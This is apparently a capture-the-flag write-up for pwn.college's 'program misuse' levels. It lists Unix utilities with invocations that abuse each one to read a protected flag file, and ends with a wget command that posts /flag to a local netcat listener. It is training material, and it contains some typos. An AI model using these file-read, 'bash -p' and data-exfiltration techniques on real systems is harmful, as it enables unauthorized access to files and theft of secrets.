# pwn-college-writups-fundamentals-program-misuse  

more  
less  
tail  
head  
cat  
emuc  
vim  
nano  
rev — prints reverse text of the file  
od — prints the octal format of the text  
hd — gives a hex dump of the file  
xxd — produces three-column output by default: file offsets, the data in hex, and the data as text  
base32 — prints base32 encoded text  
base64 — prints base64 encoded text  
split — splits larger files into smaller files which would have higher permissions  
gzip — zips the file — can be read with zcat command  
bzip2 — bzips the given file — can be read by bzgrep command  
zip — zips the file — read by zgrep  
tar — zips the file in a different format — read by tar xvf file.tar.gz -O | grep "text”  
ar — a Unix utility that maintains groups of files as a single archive file — can be read by — ar pv super.a  
env — controls the environment variable — can be read by env -i [command] [if needed commandfile]  
timeout — utility that runs a specified command and terminates it if it is still running after a given period of time. — can read files when the command is given — timeout 5 [command] [file]  
stdbuf — Run a command with modified I/O stream buffering — can read files by stdbuf -oL [command]  
search — change reported architecture in new program environment or set personality flags — files can be read by setarch --addr-no-randomize [command]  
awk — used to print a file — can be used to read the file by awk ‘’ file  
sed — replaces the text in a file — can be read by sed ‘’ file  
bash — shell scripting language — bash privilege can be maintained by — bash -p  
date — gives the current date and time — can be used to read files by — date -f [filename]  
dmesg -print or control the kernel ring buffer — can be used to read files — by dmesg -F [filename]  
wc — print newline, word, and byte counts for each file — can be used to read files by — wc -files0-from=[filename]  
gcc — GNU project C and C++ compiler — Can be used to read a file by — gcc -x c -E "filename"  
AS — the portable GNU assembler — can be used to read files by — as @[filename]  
Level 50  

wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file /flag http://127.0.0.1:4554/  
and set up a listener with nat cat  
nc -vlnp 4554  
and get the flag
